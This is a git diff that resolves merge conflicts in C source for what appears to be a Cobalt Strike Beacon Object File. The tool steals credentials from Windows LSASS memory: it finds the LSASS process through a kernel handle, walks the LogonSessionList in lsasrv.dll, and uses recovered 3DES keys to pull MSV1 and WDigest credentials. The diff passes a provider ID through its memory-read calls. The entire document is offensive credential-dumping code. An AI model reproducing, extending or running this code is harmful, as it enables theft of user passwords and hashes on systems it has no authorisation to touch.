@@ -137,11 +137,7 @@ unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lo
     return TRUE;
 }
 
-<<<<<<< HEAD
-BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
-=======
-BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId)
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
+BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId)
 {
     BeaconFormatPrintf(&outputbuffer, "[+] Stealing LSASS Credentials!\n");
 
@@ -154,13 +150,8 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
     BeaconFormatPrintf(&outputbuffer, "[+] Lsass PID: %d\n", LsassPID);
     
     // Get LSASS EPROCESS address
-<<<<<<< HEAD
-    DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
-    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber);
-=======
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile, provId);
-    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, pvWindowsVersion, provId);
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
+    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber, provId);
     if (LsassEprocessVA == 0)
        return FALSE;
 
@@ -235,13 +226,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
         DWORD64 DataSectionOffset = GetDataSectionOffset("lsasrv.dll");
         DWORD64 ImageStartAddress = GetModuleHandleA("lsasrv.dll");
         DWORD64 DataSectionBase = ImageStartAddress + DataSectionOffset;
-<<<<<<< HEAD
-        
-        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, dBuildNumber, lower32bits, LsassPID, ImageStartAddress);
-=======
-
-        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress, provId);
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
+        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress, dBuildNumber, provId);
         if (LogonSessionListHead == 0)
         {
             BeaconFormatPrintf(&outputbuffer, "[!] Failed to obtain LogonSessionList!\n");
@@ -251,12 +236,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
         BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
         BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionList: 0x%llx\n\n", LogonSessionListHead);
         
-<<<<<<< HEAD
-        DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
-=======
         DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, provId);
-        
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
         FreeLibrary(hModule);
     }
 
